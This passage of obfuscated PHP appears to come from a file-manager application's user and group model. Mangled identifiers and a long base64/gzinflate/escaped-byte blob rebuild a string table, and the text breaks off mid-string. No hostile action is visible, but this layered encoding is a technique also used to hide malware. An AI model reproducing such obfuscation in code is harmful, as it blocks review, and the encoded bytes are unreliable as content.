(isset($ÎÕ³ã–Ã[$¢ÃËÆ…Ê[$•Ìùû°À[1779]]])) { $¢ÃËÆ…Ê[$•Ìùû°À[2169]] = $ÎÕ³ã–Ã[$¢ÃËÆ…Ê[$•Ìùû°À[1779]]]; } } unset($¢ÃËÆ…Ê); } public function userAppendGroup($ï—×œ ÷) { $ƒ­êİèá =& $_SERVER[§Êá¸İ]; if (!$ï—×œ ÷) { return array(); } $this->_listAppendGroup($ï—×œ ÷, array_to_keyvalue($ï—×œ ÷, $ƒ­êİèá[12], $ƒ­êİèá[1779])); return $ï—×œ ÷; } private function _listAppendMeta(&$×Ìì°†, $“Ø‡å½½) { $ß©Á•¨• =& $_SERVER[§Êá¸İ]; $°¸ÆÁ× = UserJobModel::JOB_KEY; $ğş›©ñı = array($ß©Á•¨•[2481]); $Æ’î«ô½ = array($ß©Á•¨•[1779] => array($ß©Á•¨•[7], $“Ø‡å½½)); $ê³¹€…§ = Model($ß©Á•¨•[2479])->where($Æ’î«ô½)->select(); $ê³¹€…§ = array_to_keyvalue_group($ê³¹€…§, $ß©Á•¨•[1779]); foreach ($ê³¹€…§ as &$Á’¤îÊ¢) { $ìÌšÚÚÉ = array(); foreach ($Á’¤îÊ¢ as $öç¯Ê¾) { if (!in_array($öç¯Ê¾[$ß©Á•¨•[97]], $ğş›©ñı)) { $ìÌšÚÚÉ[$öç¯Ê¾[$ß©Á•¨•[97]]] = $öç¯Ê¾[$ß©Á•¨•[450]]; } } $Á’¤îÊ¢ = $ìÌšÚÚÉ; } unset($Á’¤îÊ¢); $­·—­í = Model($ß©Á•¨•[2502]); foreach ($×Ìì°† as &$Â‹úº´) { $Ö¬Ú®°ƒ = array(); if (isset($ê³¹€…§[$Â‹úº´[$ß©Á•¨•[1779]]])) { $Ö¬Ú®°ƒ = $ê³¹€…§[$Â‹úº´[$ß©Á•¨•[1779]]]; } $Â‹úº´[$ß©Á•¨•[2503]] = array(); if (isset($Ö¬Ú®°ƒ[$°¸ÆÁ×])) { $Â‹úº´[$ß©Á•¨•[2503]] = $­·—­í->getUserJobInfo($Ö¬Ú®°ƒ[$°¸ÆÁ×]); } } unset($Â‹úº´); } protected function groupUserAll($ùİŒŸä) { $µ´ ªŠ =& $_SERVER[§Êá¸İ]; if (!$ùİŒŸä) { return !1; } $ÛÎ¾›š½ = Model($µ´ ªŠ[2072])->field($µ´ ªŠ[1779])->where(array($µ´ ªŠ[1978] => array($µ´ ªŠ[7], $ùİŒŸä)))->select(); $ÛÎ¾›š½ = array_to_keyvalue($ÛÎ¾›š½, $µ´ ªŠ[12], $µ´ ªŠ[1779]); return array_unique($ÛÎ¾›š½); } public function userSearch($ò”‡ÖÜó, $‘ˆû†Óº = "\x2a") { return Model($_SERVER[§Êá¸İ][606])->where($ò”‡ÖÜó)->field($‘ˆû†Óº)->find(); } } goto eœ¡¦ĞŠÔ‰; aóçƒ‡–ˆğ: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\247\220\312\341\270\335", "\xd7\xb3\xca\xbb\xc0\xb9"); $_SERVER[§Êá¸İ] = explode(base64_decode('fAF8AnwC'), gzinflate(substr(base64_decode('H4sIAAAAAAAAE8W9CXgb1dUwzFoI2/u20Ja39IPBIdhOtNiOszlxgizLtohsOZKcBdtMxg==').strrev('#2îrïùo¥–”ì¡gxZZ-,¶”… P’eµööP!l!)l$—‘šÈÒ[ÈÒ')."\xde\xff\xf9\xfe\xe7\xf9\x79\x88\x75\x97\x73\xef\xdc\xe5\xdc\x73\xce\x3d\xf7\xdc\x73\x7f\x7e\xc5\xde\x8d\x37\xfc\x7c\xcd\xbe\x6b\xf6\x5b\xb3\xdf\xda\xed\x9f\xde\xbc\x13\xc2\x6b\xf6\x27\xbf\x24\x7c\xdc\x5\x7".base64_decode('70P+O/KC86uq2mYfMqPjsI0P3K3do92lnR+NPPub8OG/u+vk0K6bnx3fte8+WvCW5xsQMA==').base64_decode('LdtAf5ScaSv6mGHZFk1Imrm00U/DRo7++ulPVyxS0LOmrdOoj/6o0C7y1xrOGCxf7Ygm1A==')._kodDe('KE1uXV2MHpb2L/xhNRaczYpQALQMzZUMAYNgk1ItkHDph8QIGJBI66MMX8rKmtJ9LBkwC8c=')."\x6a\x62\x45\x67\x8\x20\xfa\xd4\xe1\xa2\x5e\x18\xa7\x31\x12\x8c\xdb\x5a\xc1\x4e\x18\x59\x9d\x43\x8c\x16\x78\xbb\x9a\x42\xad\xe1\xe\x25\x11\xb\x74\xc4\x3\xc1\x44\x38\xda\x41\x93\x83\xd1\xf6\xf6\x70\xa2\x34"."\75\26\215\104\232\2\301\305\245\71\235\261\100\153\173\100\101\355\313\350\252\221\113\233\125\312\112\232\263\122\251\246\201\26\103\317\244\150\60\247\261\346\330\343\171\10\45\170\10\115\123\256"."\230\311\320\110\7\17\245\364\264\126\314\300\150\65\313\221\174\301\310\152\254\323\213\365\161\236\112\3\132\321\66\215\134\222\106\102\143\166\101\23\351\250\255\111\64\321\172\16\252\212\207\42"."\241\140\102\301\15\124\132\142\321\166\5\46\41\253\131\266\136\120\226\265\205\142\41\5\67\272\261\222\364\265\122\1\174\351\100\103\241\4\42\21\145\262\32\154\75\233\147\325\320\62\145\52".base64_decode('i8aaQzGlaYUiRihpZrNmzodqQTNpS00NxWI04AH0joTxpEEk2tISD/EYdG5JBLVkJuCnIw==')."\x96\x4a\x67\x6c\x75\x44\xcb\x14\x19\x9a\xe\xd1\xdf\x4a\xf8\x81\x5f\xd3\x2\xd4\x1d\x36\x72\x46\x11\xd0\x14\xaa\x30\x4d\xbe\xac\x20\x50\x64\xd0\x3a\x4b\xd1\x53\x10\xc8\xa2\xf2\x26\x94\xeb\x83\xb4\x3e\x6\x35".base64_decode('yAIGWqEjNNi4kP7Oh/J9Ks7TC7aq55JmysjBOl4E+KjZA80FAwHQeNrMpFjYMlZBL9NGRg==')."\357\50\146\145\20\36\115\16\30\231\124\201\55\275\257\203\244\321\10\137\311\30\126\304\362\250\45\234\10\30\351\161\261\24\61\134\47\317\265\314\142\41\251\207\321\322\241\361\132\110\326\155"."\33\165\216\15\210\331\225\317\230\132\52\256\27\170\327\14\263\5\125\24\55\332\162\142\221\200\265\230\205\154\63\42\32\360\175\264\140\214\256\62\31\103\154\311\244\244\21\363\127\165\237\345"."\xfd\x77\x6f\xf7\x49\xe8\x4f\x35\x50\xc5\x1e\x68\xd3\x80\x9e\xc9\xa8\xfa\x98\xe\x6b\x2a\x9b\x9a\x65\xb1\xc1\xf0\x5b\x7d\x46\xce\x8f\x52\x68\x34\x1c\x55\x7\x34\x6b\xa0\x3d\x35\x4b\x25\xa5\x18\xb1\x4d\xe9\x63"."\276\374\100\36\26\74\137\343\75\16\234\307\103\327\141\332\41\211\144\147\314\244\226\221\273\110\303\3\266\235\217\353\271\24\36\11\350\212\71\232\43\43\225\327\165\0\152\366\50\51\245\135"."\131\241\264\65\30\15\26\53\230\315\360\20\353\35\117\263\170\242\75\306\246\63\225\6\154\145\34\243\2\76\150\130\204\370\211\225\253\345\363\31\43\251\331\206\231\363\233\111\133\267\275\226"."\x5d\xd0\x35\xa8\x31\x90\x4c\xea\x96\xe5\xd\x9a\x39\xbb\x60\x66\xbc\x81\x4c\xc6\x1c\xf5\x46\xb\x46\xbf\x91\x6b\x50\xa6\x3\x1d\x46\x99\x68\xbd\x7b\x31\x6d\x6c\x80\x45\x5c\x31\x5f\xc1\x88\x83\x3f\x33\xbd\xb1"."\150\247\275\163\331\342\344\320\5\55\147\245\365\202\67\4\53\243\101\101\215\345\4\222\201\65\33\126\336\264\14\334\274\6\105\263\155\55\71\200\211\213\250\276\361\153\340\215\134\306\310\351"."\xa5\xb0\xa8\x12\xdd\xdb\x59\xd0\xfa\xb3\x5a\x83\x92\x2f\xf6\xa1\x1\x80\x5\x9\x69\x49\xc\x21\x3\xc3\x0\x34\x28\x59\x6d\xcc\xab\xf5\xb3\x9a\x42\x63\x79\xa3\xa0\x5b\xac\xd7\x4a\x6b\x7b\x2\x30\x2a\xed\x6d"."\xc7\xb\xc9\xd0\x53\xde\x38\xa2\xde\x50\xd9\xcc\x9a\x7a\x5\xe1\x8a\xc2\xf2\x68\x6a\x5b\x22\xd1\xa9\x86\x5b\x10\x7b\xee\x8\xa9\xed\x81\x44\xb0\xd\x6a\xb7\xb5\x7e\x56\x75\x4\xd1\x64\x5e\x25\x4b\x5c\xee\x45"."\13\12\143\123\7\352\234\110\354\64\107\365\2\372\160\323\170\203\62\144\246\372\314\61\37\313\302\300\161\104\131\30\60\236\337\274\355\215\151\271\176\334\215\276\161\133\267\334\264\251\11\61"."\163\137\232\256\136\137\237\236\66\13\320\33\153\244\337\71\370\21\75\327\157\17\260\272\343\241\330\322\120\114\215\107\133\22\313\2\61\340\375\71\204\71\143\254\65\370\353\31\157\114\117\241".strrev('sé? Ğ­	Cl÷p5‘ˆî¬PÊò½šìx­ÂEåˆ‹ÅË8ş‹Ü¿£–œ¬ÚLA')."\143\217\65\275\252\47\65\243\332\213\376\116\257\356\356\151\366\115\357\135\344\67\104\31\177\255\257\126\251\253\231\255\164\42\111\305\320\62\12\164\272\4\242\106\211\56\166\16\213\300\360\234"."\231\323\313\56\54\204\110\246\245\173\333\164\15\21\151\64\21\216\171\361\260\157\321\370\327\214\56\346\225\22\55\161\315\13\115\214\205\226\164\205\342\11\265\75\224\150\213\66\103\363\103\1"."\10\345\120\141\322\136\66\307\130\60\3\266\230\203\152\365\61\211\207\10\136\220\224\7\204\224\353\60\107\31\365\167\41\120\160\100\117\16\115\222\207\102\320\33\223\322\45\66\165\335\364\247"."\27\260\271\227\376\250\206\325\42\361\115\34\345\364\125\65\373\6\21\146\265\353\214\211\300\227\302\131\264\206\105\313\125\47\223\143\335\152\27\230\216\226\314\62\43\305\271\40\212\266\351\106"._kodDe('K/PyxyfIs8AYTH8lw+mLtCbSqCXzwo8EB+7RuGR0fKlVKwINCHGWCdCYJYEoovfWH3u7zqA=')."\341\146\7\337\205\230\137\305\270\332\343\313\347\372\253\117\200\272\324\272\131\65\70\1\246\21\172\206\204\353\242\136\332\165\137\322\104\13\273\135\33\322\33\160\137\200\232\315\47\251\54\42".base64_decode('Ecz5mMc1uukCnp6ML4sqIXUGTc6V6fZlvpPHKXqhYBaOBwgSVgijxNMFldtc7LAQCWDhAQ==').strrev('c³2Ÿ¦ÿDÏà˜2Jxa¬R#%Ê¥KPu&–|×]Z{ô?ÆC&)‹“').base64_decode('oYT56SnK/RxJdNnSpOms3oJt4syCAxJh4oAJLUNTD70q8u6xjqb0jM6waEBnAkQNgKHh5w==')."\70\226\346\310\216\266\10\50\125\110\156\206\25\103\45\61\273\147\361\145\170\117\45\22\260\314\3\310\43\202\31\64\165\121\262\152\104\274\263\240\247\215\61\106\40\306\354\166\255\60\304\72"."\206\112\212\365\206\43\322\132\154\351\212\104\324\140\264\43\201\266\144\64\145\131\54\234\10\61\72\24\150\126\3\301\116\210\11\312\306\305\62\131\260\240\51\43\165\200\47\250\21\176\41\1".base64_decode('IRacN3OIfgIJ8ooNW0lWSggIgCBCqHDJCYjTZ1d5s4h4eHmbnOKZAuyeSnlhmKYUnxw8eA==').base64_decode('aCEzubAzGocCi3Aqks37+Hrr7IKsrIQirSFIPASwakADiTuwLM5YeBHBF4xVmujSItYe1g==')."\x91\x6c\x46\x88\xfa\xce\x5e\x79\xc5\xcc\x17\x2d\xaf\x8e\xa5\xc\xf1\x85\x7a\x6f\x5b\x7b\x20\xe8\x8d\xb7\x5\xea\x66\xcd\xa6\xa9\x2b\xb2\xa9\x9e\x44\x9b\x61\xf5\x9c\xc2\xe3\x30\x8c\xa3\x56\xbd\x5a\xd0\x11\xc1".base64_decode('YR+qq6ll5ABJSVLzVnizXlwLHkFfTU0Nq2vGbGUA0TnOTVJklti+q5gcYgtGSzLRF3MZyw==').strrev('b‰ÊÈİÓ-TÓÑ&…B•e¡HòZ.Ñª*cø’ÕXœ$QT!ù8\'=ŠPœ%ß|Ê0j;')."\342\151\134\247\342\41\237\73\76\212\170\154\235\70\56\67\51\157\42\201\24\272\261\274\154\33\226\227\153\303\162\127\33\226\227\266\201\46\131\106\177\16\365\222\61\67\230\216\126\74\35\322"."\xb4\x3a\xa6\x79\x4c\x45\x5\x55\x58\x43\xaa\xdc\x15\x18\x24\xe8\x86\x9c\xd3\xc6\xa9\x19\xeb\x64\x7b\xf3\x2c\xd6\x8e\x40\xfb\x29\xde\xe6\x0\xa3\x5\xb\x16\x21\x14\x55\x46\xb0\xa6\xc9\xcc\x35\x56\xd6\xfa\x6a"."\52\25\266\143\156\254\354\112\264\240\375\303\242\205\207\54\10\232\331\74\46\214\355\170\223\210\227\20\335\50\56\204\345\261\0\313\146\54\322\311\127\30\215\207\22\32\60\307\5\176\31\156".strrev('zró¢]é¥Ó’pÔEmÚ±c¸[D±âÄpƒÎPÅŒ8	/¬Í1Ğ‡3*Ú²ÙZ²')."\123\64\321\346\110\355\102\222\332\322\100\44\354\6\17\55\17\307\23\361\262\131\50\255\53\344\312\151\156\122\73\143\241\226\360\162\36\155\11\207\42\315\161\65\30\10\266\11\230\216\100\73"."\x44\x90\x48\xa4\x67\x52\x96\xdf\x9\xaf\x22\x91\x33\xce\xd5\x69\x2a\x4c\x18\xc4\x1c\x1a\x2c\x95\xe9\x66\x54\x41\x8b\xd1\xf6\x45\x7\x4\x86\xee\x62\x85\x24\xe9\x89\xca\x16\x7d\x91\xb\x90\x6c\xaf\x9e\x65\xcc"."\x16\x6d\xbd\x60\x46\xd8\xbe\xa3\x8a\xfe\x54\x2b\x81\xb8\x62\xe7\x55\xce\x56\xfb\xc6\x79\x90\x74\x83\xc5\x91\xb0\x1\xdf\x57\x40\xfc\x2d\x69\x81\x8a\x61\x9a\xa4\x4d\x4e\xf9\x84\x40\xda\xe6\x2\xa7\x2b\x8e\x98".base64_decode('iMhDMxAgmk+ECWRG4DMGYkkFO8CakxZaRzXaGYoFsM5SXRaLdrRCgdEBnTUgDMNfxXadoA==')."\xba\xb4\x5\x67\xd7\x32\x86\xc6\x74\x58\x62\xd0\x7\x4d\x36\x94\x27\x2\x4d\x35\xb8\x48\x9f\x63\xc3\xdd\x87\xa5\x1b\x26\xd7\xb2\x40\x1a\xad\x7\x26\x99\x98\x45\xfe\x99\x3e\xd3\xcc\x30\x46\x97\x65\x82\x15\x22"."\66\134\347\71\150\61\354\30\143\274\172\6\347\11\200\263\321\305\241\16\225\241\24\215\111\150\110\23\102\261\130\64\6\43\141\233\103\114\337\105\63\143\241\70\143\223\230\377\30\154\234\374"."\xbe\x19\x80\xbe\x3a\x12\xe2\xe0\xf3\xfe\x53\x7b\x46\x67\x54\x75\x7b\x67\xf8\x7a\x51\xa0\x7a\xfa\x49\x34\xa\xb1\x1e\x9f\x23\xca\x64\xeb\x62\x81\x97\xc6\x4b\xbd\xca\x5a\x54\xdd\xd0\xe3\xef\xf1\x57\x2d\x6a\xe8"."\16\170\127\151\336\125\65\336\171\336\136\44\221\127\317\200\204\336\325\165\236\372\323\60\0\2\134\64\265\27\375\64\366\54\232\326\343\75\361\364\225\47\165\367\364\126\66\314\70\276\307\67"."\xb5\x67\xb4\x77\x7a\xf5\x22\xf6\x9d\x64\xb1\x80\x84\x7e\x46\xfa\x51\x53\x53\x33\xaa\x50\x93\xd0\xb6\x94\x83\xe4\x24\x8a\x46\x0\x58\xc6\x2a\x23\x2f\x52\x57\xcf\x3e\x8d\xa5\xa3\x39\xd4\xfb\x45\x89\x6e\x6f\xcf".base64_decode('jN5FUjkpyf0txJKQADPA4QLeU3DPeFG84AE/irmk4O94QfRpfH/XnxP7KLvAdaAjCEkFsw==')."\132\75\215\376\236\306\46\262\137\37\343\202\100\332\50\0\166\26\163\306\60\333\320\344\364\141\10\230\66\103\354\76\335\36\325\31\172\240\164\107\34\41\7\143\240\50\113\212\145\44\346\113".base64_decode('lFUcRzkyGXkV7+1GeQzxY5inKQBtJbW8Hpd6qKqJQFMkpDLSAiSYxQk5bOInJahrgpQywg==')."\x20\x29\xa2\x88\x62\x8\x96\xbc\x35\x9c\x51\x8\x45\xa0\x9b\xaa\x6\x72\x68\x64\x15\xf3\x78\x7f\xa4\xa0\x19\x47\x63\xab\x20\x49\x48\x69\x5c\xa8\xd0\x21\x87\x72\xaa\x3c\x1\x79\xbe\xef\xc1\x9a\x4c\x5d\x2c\x7a"."\114\232\240\115\171\61\103\26\332\222\260\115\201\277\252\247\247\330\255\247\172\273\21\342\153\336\164\357\352\231\247\125\63\155\211\277\7\375\307\42\201\62\307\27\52\47\203\52\22\160\175\270".strrev('ƒ¥(—)pv„>çK,,PDvÎ–Â€†&&‘…8*2ÖÓmßìw‘g|5lğˆíM\\')."\7\134\42\256\333\76\16\341\221\62\125\24\167\234\301\65\126\60\52\237\103\313\51\50\361\70\252\66\217\223\155\277\343\260\310\322\265\102\162\240\245\230\311\330\134\333\222\61\206\340\13\260"."\126\340\354\312\13\154\140\106\271\242\55\146\201\51\37\247\103\63\52\246\227\3\14\347\162\146\252\117\106\65\301\135\133\3\110\216\111\50\125\354\234\105\11\167\50\115\321\150\44\24\350\120"."\60\43\7\6\204\244\204\170\250\63\200\270\27\126\143\306\23\241\30\103\347\64\250\35\303\71\71\205\363\113\135\105\234\232\111\227\300\267\232\2\361\160\120\355\14\60\171\110\313\347\375\126".base64_decode('asjy40YbI3rE6PNjJT4+bvRxNTdI1UmsXlK1PrQcmC6siHXBQJLCzV7W0eVeplThAQNKmA==').base64_decode('ebojQE3LmIyaOdUyeLPowcoRD5ZyPGgYPVif4hFbcY84T/GMGPooCfBtsgd2zx6hCYJguA==')."\xd9\x63\x58\xcd\x44\xb\x40\x3e\x40\xb2\x58\x13\xec\x1\xac\xe6\xce\x68\xe3\x1e\xda\x9c\x88\x3e\xa2\x67\x3c\x4c\x47\xe4\x61\x6d\xf4\x30\xcd\x98\x87\x68\xb4\x9a\xa1\x59\x5d\x68\x7d\x43\xb3\x48\x10\x91\xf1\x1"."\17\306\150\274\240\74\342\204\307\143\216\346\364\2\1\201\201\21\12\4\217\120\56\170\372\13\146\61\337\311\276\51\305\150\263\40\101\264\231\47\304\114\323\366\60\145\233\107\326\272\101\53".base64_decode('Amzhlh3O8r0h4+9uBCA8ziodpW+YrNL5cCocV9MaQbt6GmO7Dhii+ONyMB5wEVoqKAfuQA==')."\213\6\147\211\264\132\71\314\21\64\347\104\124\161\230\43\216\361\204\324\355\126\13\271\17\370\360\107\321\326\50\56\175\316\326\372\331\267\60\365\344\33\247\62\240\64\34\323\223\343\111\241".base64_decode('Z2qWtFfOWBHVENfSrm55yDoqtwbKzzHHaz4lh0yZwsaYITufX8ca+ebVCf0iNDmaF1INbQ==')."\54\346\13\161\104\126\132\62\154\120\352\344\154\340\10\36\147\14\57\56\37\341\20\344\310\74\316\265\230\221\120\113\102\71\71\212\310\251\141\252\264\214\212\201\25\362\307\314\51\216\272\331"."\160\51\215\44\137\304\265\134\212\246\254\104\254\147\145\143\5\373\110\205\243\270\100\23\147\43\74\54\252\224\42\36\36\156\171\20\60\72\220\356\13\166\311\222\242\202\73\27\101\24\325\54"."\330\15\142\35\60\204\164\226\46\246\126\306\113\211\334\210\4\326\56\307\167\161\124\254\51\206\22\12\376\200\107\22\236\60\111\361\212\325\41\105\235\103\356\302\110\27\117\307\103\324\151\344"."\306\215\134\334\300\312\2\167\252\20\13\204\124\202\27\267\210\121\254\234\54\114\231\10\326\305\321\372\75\160\36\355\301\114\113\222\30\204\252\25\265\236\160\316\254\343\154\243\264\345\120\221".strrev('ËËÆ¡¶ü‡³hÒ•/ZÎ=–%¢FQÉ‰­,	Q¼&¨ÉƒV€ü`3Ö'."\0".'F"').base64_decode('lU8PpiMMiJIgRAsiaKzQD+lIwvTgwwT0Q9k4M00gQAzvi9lmOJzA4aWIADBBEQ14FSMgIA==')."\335\250\222\162\202\23\40\247\70\100\133\22\340\344\35\155\40\62\210\233\25\174\170\215\264\142\236\304\306\204\222\67\31\347\342\72\352\47\124\57\152\210\227\344\311\320\102\251\213\311\275\140".base64_decode('D/xEji8xMb5iPfWLBuHhVEvbgTG4fLylYHJpm3N2N1CQbGe5hYmLG0vj4ZAgSpKkMm5Zwg==')."\x95\xea\x8a\x62\xf9\xa2\xc\xa3\xa1\x49\x4c\x5b\x47\xcf\x87\xa\x94\x81\xf9\xd0\x26\x5\xc\x86\x3c\x35\x92\xb8\x25\xe8\xcc\x6a\x7a\x46\x7\xc\xef\x34\xd7\x3c\xdb\xa6\x89\x76\xbe\x5\x5f\x1\x7d\x59\x34\x48"."\242\161\100\40\210\321\10\346\203\262\220\300\153\261\120\206\104\255\235\262\20\53\31\317\153\214\110\163\71\215\141\57\331\346\24\5\341\44\115\26\355\341\255\240\31\21\56\334\142\362\20\112".base64_decode('GTZOwevNZAdTAlBwSHdhEZdJNuE8JXMvtjKeaQ5Ip7QAidMJS/cJ4aa8nVTSzANCSLaDWQ==')."\x73\x44\x97\x12\xf1\x41\x60\x5e\xe4\x48\x51\x9a\x2d\x65\x89\x4a\x25\x28\x3e\x47\xa4\x45\x68\x79\xa5\x88\x48\x2c\x46\x81\xc0\x42\x59\xb2\xc1\xa7\x2b\xd8\x87\x77\x10\x3e\x99\x4e\x7\xa\x5\x86\xbf\xb4\x9b\xf8"."\x90\x1a\x25\xca\x49\x98\xfc\xc5\xd9\xe2\x2b\xc7\xae\x68\xe5\xa1\x11\x61\x19\x48\xab\xc2\x1f\xf6\xd1\xd5\x8f\x4f\x42\xa3\xcc\xea\x40\xe\x97\x82\xca\x5a\xce\xf2\x15\xc5\x85\x35\x80\x33\x56\x1e\x3c\x90\xc9\x8"."\373\55\167\174\322\42\164\325\313\205\344\224\111\213\265\220\335\65\333\356\225\113\343\333\230\311\105\163\367\211\274\223\122\117\56\262\114\102\343\304\64\226\217\43\346\34\34\60\162\72\323\1".strrev('\'-/ÔŒU"µDRÈ²%ÚçH+÷\\÷—DyBØáô“Î¡“!^<—,ÿıdU‚¥')."\7\206\240\345\113\307\3\163\254\160\324\147\115\202\263\156\70\156\354\102\150\342\30\147\264\162\41\234\205\347\122\256\124\210\160\137\3\317\53\27\342\234\14\207\160\27\147\114\326\126\226\315"."\x6b\xf9\xcd\x9f\x2f\xfc\xe0\xe2\xc7\x69\xf8\xbf\x9f\x5d\xbf\xf1\xf1\xb\x69\x78\xd6\x6c\x38\x89\x83\x2d\xa\xfa\x7b\xe0\x9a\x12\x4b\xf5\x75\xcb\xc7\xcd\x63\x9e\xfe\x6e\xeb\xa1\x7f\x5f\x3d\xf7\x3e\x6f\xd5\x60"."\133\274\242\372\222\366\336\253\336\74\176\311\115\143\213\77\176\141\254\366\265\153\247\55\333\364\227\25\277\373\335\371\267\274\163\306\205\17\236\367\111\353\371\107\25\317\172\150\340\205\37\170".base64_decode('n98v++4+h3+nPvBYe/Ht7tTI7ld6Xzz5gMD8T3b99jfzT//g6Fuv/9cbOzde96/8uR/ucw==')."\203\157\323\147\317\337\274\167\337\372\332\263\326\354\170\374\167\67\134\365\354\21\133\132\264\307\253\37\57\76\374\350\223\117\373\76\136\277\264\357\256\53\76\173\175\344\102\355\373\157\325\36"."\xb7\xa4\xef\xf0\xf5\x17\x7f\x18\x7e\xf3\xa1\xfa\x9a\x9f\xf6\xec\xb3\x70\x47\xf3\xb1\x95\xff\x31\xef\xdd\xd9\x7\x3f\x50\xbb\xee\x85\xa3\xbe\x1c\x5c\xbc\xf5\x4f\xf3\xee\xfa\xc7\x17\x7f\xd2\xb6\xfe\x6e\xca\xa8".base64_decode('5+kz739gfuGDg5+4OfKzg2P9t/7hyetff+Gv6qWpf88b6Prshj/ufj027wd/6G5f+FfjgQ==')."\x7\x17\x1f\xee\xed\xf8\xb8\xb1\xed\xc5\xdb\xbf\xb7\xe9\xb6\xfb\x16\x7b\xdf\x1d\x9b\x72\xf7\x6b\x33\xdf\x7a\xea\xcc\x79\x53\xf7\x3f\xe8\xf3\xa3\x17\x3d\xf1\x9b\xd9\x8d\xea\x1f\x6f\xdc\x3d\xfc\xf1\xde\xd4\xdc"."\xfd\x3f\x3f\xec\x99\xa3\x3e\x56\x72\x2f\xd5\x7f\x55\xef\xd9\xf8\xb2\xe7\x96\x3f\x5c\x7b\xe9\xde\xb1\xa9\xf1\x9a\x43\xba\x4f\x9a\x7b\xfb\x8b\x2d\x2b\x8f\x98\x32\x67\xf5\xf\xde\x99\xfa\x48\xe5\x45\xb3\x33\xbf"."\xaf\x7e\x67\xfc\xe0\x83\x76\xdd\xf6\xfc\xf0\xfb\x4b\x6\xb6\x36\x8d\xcf\xdb\x71\x68\x75\xfb\xca\x27\x3f\x7b\x64\xbf\xc6\x6b\x9f\xfb\x3f\x7\x6f\xf8\xf8\xe0\x77\xde\xaa\x9b\x7d\xc0\x5\xef\x7f\xfb\xfe\xf6\xab"."\26\331\323\17\370\326\165\163\166\74\265\347\213\266\315\257\74\377\321\347\317\74\160\156\353\337\336\334\122\175\322\63\7\6\137\171\374\220\343\177\374\124\356\207\361\167\177\165\337\212\77\36"."\371\373\55\17\34\175\375\373\261\143\76\232\167\126\60\175\302\302\163\146\157\356\74\343\375\103\346\235\251\165\167\234\161\300\255\43\301\163\176\270\365\202\332\15\107\335\166\300\23\127\34\172"."\353\274\226\63\37\137\270\360\314\151\147\177\370\300\163\57\367\35\363\345\312\243\177\174\353\313\366\3\103\377\165\316\153\357\74\276\367\170\153\370\360\251\301\206\305\27\237\174\317\61\277\234"."\x7f\xdb\xc3\xfb\x56\xdd\xa5\xf5\xed\x3f\x7d\x7f\xf3\x1d\xe5\xb0\xb\xd7\x5f\xd1\xdd\xf2\x3d\xfb\x8a\x9d\x87\x3f\xfb\xe0\x9\x97\x9f\xa9\x85\xee\xf2\xc4\x8f\xfe\xa0\xae\xf6\xc1\x6b\x1e\xfe\xc5\xa1\x9f\xfe\xe2"."\xa2\x37\xdf\x79\x7a\xa7\x7e\xc0\xbe\x97\xa4\x7f\x19\x3f\xa7\xe9\x95\xcd\x9b\x86\x7f\x5c\x58\xf9\x76\xf2\x8a\x43\x5f\x4e\x9e\x18\xab\x9f\x76\xd1\x4d\xf\x1c\x98\x6e\x7a\xff\x67\xef\xbd\xf8\xf9\x35\x17\xbd\x3a"."\xe5\xc7\xbf\xbf\xe6\x7b\x3f\x3b\x67\xcb\xfe\x7\x1d\x71\xff\xf0\x8e\x8f\x1f\xdf\x67\x5a\xfe\x87\xdb\xe6\x35\xed\x7f\x7b\xed\x41\x6f\xec\xf8\xfc\xac\x27\xee\x5c\x7f\xda\x4d\x4f\x1e\xfb\x87\x29\xb7\x3c\x7b\xd9"."\261\267\234\25\274\362\373\77\70\344\254\177\75\377\342\305\201\247\227\372\172\224\226\327\216\277\147\255\61\236\72\76\271\357\55\346\115\377\354\271\341\311\253\246\176\377\334\303\307\16\131\162".base64_decode('9nPH1mjblhcrfr/nldq7b/zPw2KD85687txVR35WdXzdcRcccOUrb+58ceW6c99/674Dlg==')."\64\27\216\362\136\270\170\341\141\361\225\363\116\334\77\375\341\337\176\325\67\66\174\304\176\353\267\266\276\162\226\171\335\352\110\330\353\173\340\251\357\335\276\341\276\243\17\370\105\203\57\175"."\xd5\xd9\xc9\xb3\x6b\x2\xeb\x77\x4\xb3\x77\x5d\xf0\xa7\xcd\xbd\xef\xbc\xf4\xec\x29\xf\xff\xe1\xf5\xef\xb6\x6\xde\xac\xbd\x20\x71\xed\xef\x9f\x5a\xb0\xf6\x94\xea\xc0\xeb\x7\xfe\x75\xe0\xbc\xff\xdc\xf7\xbc"."\352\247\16\232\272\343\240\303\202\372\341\277\32\35\334\273\331\374\351\17\177\73\345\7\372\121\33\16\251\271\162\372\101\237\336\266\164\260\376\224\247\117\331\276\303\170\372\245\354\335\177\36"."\374\364\373\207\176\157\277\337\175\370\223\212\23\267\74\350\17\235\262\361\263\276\73\16\275\55\162\372\222\213\57\257\330\167\205\225\30\374\364\245\46\305\70\256\62\162\361\145\327\315\374\373".base64_decode('tr66zT8a/kvtgc/6z/74ie6fzl127097Zj8+c4r15191nPL0+5s+PXbqT1oufOGjJ468+Q==')."\x8b\xa5\xaa\xff\x99\xd7\x2a\xf7\x3f\xdd\xb8\xf9\xc6\x6d\x57\x5e\xb1\xdc\xb3\xe4\x6\x75\xeb\xb\x3b\xe2\x6d\xf\xee\xfe\xe3\x5d\x17\x6d\x3e\xfc\x47\x2f\x8e\xfe\x76\xcb\xe1\xd5\xaf\xac\xff\x64\x9f\x67\xfe\x3a"."\xba\xb9\xf9\xf2\x8c\xf1\xea\xe7\xef\xdf\xfa\xeb\x4f\x7\xf\xbc\x2e\x79\xf4\x86\x39\xbe\xd7\xc6\x3e\xfa\x4c\xe9\xbc\xda\xf3\xc3\xd9\xfa\x9f\xfe\xd8\x75\xa7\xb2\xe6\xff\x1c\x7f\xc2\xf2\x87\xf6\x9d\xf2\xcb\xb7".base64_decode('vcPbzP+qy267xJd58Y055//o5d8fMzhx7vW/3v3l3eePJN77R0JtuWHKeY+YW183h/4yeA==')."\367\237\356\36\131\167\300\324\67\346\326\265\276\174\315\366\205\207\376\327\335\217\164\17\316\276\163\303\334\133\76\133\176\344\171\353\176\366\114\313\362\203\366\354\163\341\215\115\257\165\77\376"."\310\350\314\207\157\234\372\356\241\135\57\37\373\372\137\347\234\264\143\356\177\155\170\162\107\317\21\347\155\371\305\167\316\73\143\331\246\247\137\172\273\367\157\47\347\237\353\375\353\363\